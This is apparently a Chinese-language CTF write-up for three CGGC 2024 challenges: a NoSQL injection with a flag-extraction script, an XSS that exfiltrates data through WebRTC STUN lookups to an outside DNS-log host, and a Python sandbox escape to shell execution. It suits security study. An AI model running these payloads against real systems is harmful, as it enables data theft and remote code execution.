# cggc final 2024

## 💉 SQLi Payload Generator

Category: Web

Solves: 8/12


這題的服務是給一個 SQL injection Payload 生成的網站，並且可以記錄已經生成的 Payload 的歷史記錄，並且能夠把歷史記錄內的 Payload 加入我的最愛。

整體程式是透過 mongodb 作為資料庫，可以看到以下的程式碼片段，可以發現直接將 `requests.json.get("history_id")` 拿去 `history_collection.find_one`，因此我們可以進行 NoSQL Injection

```python
@app.route("/favorite", methods=["POST"])
def toggle_favorite():
    if "username" not in session:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.json
    history_id = data.get("history_id")

    if not history_id:
        return jsonify({"error": "History ID required"}), 400

    history_item = history_collection.find_one(history_id)

    if not history_item:
        return jsonify({"error": "History not found"}), 404

    current_status = history_item.get("favorite", False)
    history_collection.update_one(
        {"_id": history_item.get("_id")}, {"$set": {"favorite": not current_status}}
    )

    return jsonify({"message": "Favorite status updated successfully"})
```


構造如下的 requests 會回傳 `{"error":"History not found"}`

```json
{
    "history_id": {
        "username": "admin",
        "generated_payload": {"$gt": "D"},
    }
}
```

構造如下的 requests 會回傳 `{"message":"Favorite status updated successfully"}`

```json
{
    "history_id": {
        "username": "admin",
        "generated_payload": {"$gt": "B"},
    }
}
```

更多語法可參考：https://www.mongodb.com/docs/manual/reference/operator/query/

透過這樣可以撰寫二分搜 payload 把 flag 掃出來

```python
import requests
import uuid
import string

url = "http://10.99.210.103:8019/"

username = str(uuid.uuid4())
password = str(uuid.uuid4())

s = requests.Session()

s.post(url + "register", json={"username": username, "password": password})
s.post(url + "login", json={"username": username, "password": password})

words = sorted(string.printable)

del words[words.index("|")]
print(words)
flag = ""

while not flag.endswith("}"):
    lb = 0
    rb = len(words)
    while lb + 1 < rb:
        mid = (lb + rb) // 2
        payload = {
            "history_id": {
                "username": "admin",
                "generated_payload": {"$gt": f"{flag}{words[mid]}"},
            }
        }
        r = s.post(url + "favorite", json=payload)
        if "History not found" not in r.text:
            lb = mid
        else:
            rb = mid
    flag += words[lb]

    print(flag)

print(flag)
```

## 📒 Markdown Note

Category: Web

Solves: 3/12

這題是個 XSS 挑戰，自己寫了一個 markdown parser，大概長這樣：

```python
import re
import html


class MarkdownParser:
    def __init__(self):
        self.rules = [
            # Headers
            (r"^# (.+)$", self._handle_h1),
            (r"^## (.+)$", self._handle_h2),
            (r"^### (.+)$", self._handle_h3),
            # Code Blocks
            (r"```(.*?)```", self._handle_code_block, re.DOTALL),
            # Images
            (r"!\[(.+?)\]\((.+?)\)", self._handle_image),
            # Links
            (r"\[(.+?)\]\((.+?)\)", self._handle_link),
            # Emphasis
            (r"\*\*(.+?)\*\*", self._handle_bold),
            (r"\*(.+?)\*", self._handle_italic),
        ]

    def parse(self, text):
        """parse markdown text to html"""
        text = html.escape(text)
        paragraphs = text.split("\n\n")
        parsed = []

        for p in paragraphs:
            if p.strip():
                parsed.append(self._parse_paragraph(p))

        return "\n".join(parsed)

    def _parse_paragraph(self, text):
        for pattern, handler in self.rules[:3]:
            match = re.match(pattern, text.strip())
            if match:
                inner_content = self._parse_inline(match.group(1))
                return handler(inner_content)

        parsed_content = self._parse_inline(text)
        return f"<p>{parsed_content}</p>"

    def _parse_inline(self, text):
        result = text
        prev_result = None

        while result != prev_result:
            prev_result = result
            for rule in self.rules[3:]:
                pattern = rule[0]
                handler = rule[1]
                flags = rule[2] if len(rule) > 2 else 0

                def replace(match):
                    groups = list(match.groups())
                    if handler != self._handle_code_block:
                        groups = [self._parse_inline(g) if g else g for g in groups]
                    return handler(groups)

                result = re.sub(pattern, replace, result, flags=flags)

        return result

    # handlers
...

def parse_markdown(text):
    parser = MarkdownParser()
    return parser.parse(text)

```

可以看到有巢狀解析的功能，這種功能通常都會有一些問題，可以嘗試以下 payload

```
![ouo[](2)](123 xxx=999))
```

就會發現我們能成功控制 img 的 attribute

```
<img src="2" alt="ouo<a href=" 123="" xxx="999&quot;">
```

因此我們就可以嘗試加上 onerror 跟 src

```
![ouo[](2)](123 onerror=alert`` src=x))
```

便可成功達到 XSS

```
<img src="2" alt="ouo<a href=" 123="" onerror="alert``">
```

Bot 在做的事情就是創建一個具有 flag 的文章，因此我們只要 `fetch('/')` 就可以成功拿到 flag。

接下來這題具有以下的 CSP，因此不能透過 fetch 等方式將 flag 傳出去。

```
<meta http-equiv="Content-Security-Policy" content="connect-src 'self';">
```

這時候可以考慮以下方式
1. 透過 redirect 把 flag 傳出去
2. 透過 img 的 src 把 flag 傳出去
3. 透過 `WebRTC` 把 flag 傳出去
4. 透過 `DNS prefetch` 把 flag 傳出去

第一個做法因為有透過 chromium policy 限制 `URLAllowlist` 讓他不能存取其他的網頁，就無法透過 `window.location = "http://requestbin.com?a=flag"` 的方式。

可以嘗試第二或第三種方式，這邊採取第三種方式，並且搭配 dns log 就可以成功從 dns log 中拿到 flag，最終 exploit 過程如下：

第一步，建立 XSS note

```
![ouo[](2)](onerror=a=`'`+location;[]['constructor']['constructor']`_${a}```  src=x))
```

第二步，觸發以下 JavaScript，由於 domain 有小寫限制，與 64 個字上線，因此先轉為 hex 與切片。

```
fetch('/').then(res => res.text()).then(res => {{ const chunks = (s => {{ let hex = '', match = s.match('CGGC.*')[0]; for (let i = 0; i < match.length; i++) hex += match.charCodeAt(i).toString(16).padStart(2, '0'); return [...Array(Math.ceil(hex.length / 32))].map((_, i) => hex.slice(i * 32, i * 32 + 32)); }})(res); chunks.forEach(chunk => {{const stunServer = `stun:${{chunk}}.{dnslog_server}`; console.log(stunServer); const pc = new RTCPeerConnection({{iceServers: [{{'urls': stunServer}}]}}); pc.createDataChannel('d'); pc.setLocalDescription();}}); }});
```

完整 payload:
```python
import requests
import re
import base64


url = "http://10.99.210.103:8024/"
dnslog_server = "u9lh0wo.q.dnsl0g.net"
# https://dnsl0g.net/

s = requests.Session()
s.post(
    url,
    data={
        "note": "![ouo[](2)](onerror=a=`'`+location;[]['constructor']['constructor']`_${a}```  src=x))"
    },
)

exp_note_id = re.findall(r'href="/note/(.*?)"', s.get(url).text)[0]

payload = f"fetch('/').then(res => res.text()).then(res => {{ const chunks = (s => {{ let hex = '', match = s.match('CGGC.*')[0]; for (let i = 0; i < match.length; i++) hex += match.charCodeAt(i).toString(16).padStart(2, '0'); return [...Array(Math.ceil(hex.length / 32))].map((_, i) => hex.slice(i * 32, i * 32 + 32)); }})(res); chunks.forEach(chunk => {{const stunServer = `stun:${{chunk}}.{dnslog_server}`; console.log(stunServer); const pc = new RTCPeerConnection({{iceServers: [{{'urls': stunServer}}]}}); pc.createDataChannel('d'); pc.setLocalDescription();}}); }});"
payload = f"#';eval(atob('{base64.b64encode(payload.encode()).decode()}'))"
payload = "http://markdown/note/" + exp_note_id + payload
print(payload)

s.post(
    url + "report",
    data={
        "url": payload,
    },
)

# you will get flag in dns log
```

## 😈 Safe Eval

Category: Misc

Solves: 1/12

pyjail 題，題目很短，題目敘述已說明哪些東西可以用哪些不行：

```
TL; DR;

Given `eval` and one `(blablabla)`, but no `_` and no `[]`.
```

```python
#!/usr/local/bin/python3

import re

expr = input("Enter code: ")

if len(re.findall(r"\([^)]+\)", expr)) > 1:
    raise NameError("only one (blablabla) %r" % expr)

if "[" in expr or "]" in expr:
    raise NameError("no [] %r" % expr)

code_obj = compile(expr, "<sandbox>", "eval")
for name in code_obj.co_names:
    if "__" in name:
        raise NameError("no dunder %r (%r)" % (name, expr))

print(eval(code_obj, {"__builtins__": {}}, {}))
```

會透過 regex 確認 `()` 內有東西的情況只能出現一次，但 `()` 內若沒有東西可以出現多次。

會透過字串看 `[]` 都不能出現。

把輸入字串 compile 成 code Object 後走訪全部的 `co_names` 若出現 `__` 就直接報錯。


有釋出一個 hint
- 真的不能用 `_` 嗎？ 
- 還是出題者有可能沒有檢查清楚放在其他地方的 `_`？

因為只會走訪第一層的 `co_names`，因此如果 `co_names` 裡面有另外一個 code Object 也不會進去看。

所以可以構造以下 payload，因為 lambda function 在 compile 完後會是 code Object，因此我們可以把 `_` 放在裡面。 可以像這樣取得 object。

```
{lambda:''.__class__.__base__}.pop()()
```

`[]` 的部分會讓我們在取陣列元素的時候遇到困難，像是 `object.__subclasses__()[124]` 的時候就會有問題，但可以用 `__getitem__(124)` 來繞過，不過這就會佔用到 `(blablabla)` 的數量，因此我們直接 for loop comprehension 來繞過，像是：

```python
v:={x for x in ''.__class__.__base__.__subclasses__() if 'verify' in x.__name__}.pop()
```

那最後我們可以透過這樣拿到 `__import__` 

```python
v:={x for x in ''.__class__.__base__.__subclasses__() if 'verify' in x.__name__}.pop(),
__import__itr:={o for o in v.__init__.__builtins__.copy().items() if '__import__' in o}.pop().__iter__(),
__import__itr.__next__(),
__import__:=__import__itr.__next__()
```

可以透過這樣拿到 `exec`

```python
execitr:={o for o in v.__init__.__builtins__.copy().items() if 'exec' in o}.pop().__iter__(),
execitr.__next__(),
exec:=execitr.__next__(),
exec('__import__\\x28"os"\\x29.system\\x28"<PWNPWN>"\\x29')
```

於是就可以直接 RCE 了

```python
import sys

base = "{{lambda:{}}}.pop()()"
payload = """{
v:={x for x in ''.__class__.__base__.__subclasses__() if 'verify' in x.__name__}.pop(),
__import__itr:={o for o in v.__init__.__builtins__.copy().items() if '__import__' in o}.pop().__iter__(),
__import__itr.__next__(),
__import__:=__import__itr.__next__(),
execitr:={o for o in v.__init__.__builtins__.copy().items() if 'exec' in o}.pop().__iter__(),
execitr.__next__(),
exec:=execitr.__next__(),
exec('__import__\\x28"os"\\x29.system\\x28"<PWNPWN>"\\x29')
}""".replace("\n", "")

payload = payload.replace("<PWNPWN>", sys.argv[1])
payload = base.format(payload)

print(payload)
```

另外由於 regex 寫爛，導致在括號裡面放括號的時候也會只算一個，所以會有以下非預期解（From @nella17）

```python
(lambda: 
    {0:
        {0:
            {0: y('cat /flag*').read() for x, y in x.__init__.__globals__.items() if f'{x}' == 'popen' }
            for x in x.__subclasses__() if f'{x}' == "<class 'os._wrap_close'>"
        }
        for x in ().__class__.__mro__ if f'{x}' == "<class 'object'>" 
    }
)()
```

但其實已經非常像正解了，僅有最外層 lambda 建立並呼叫改為用 set 來建立並呼叫就是預期解。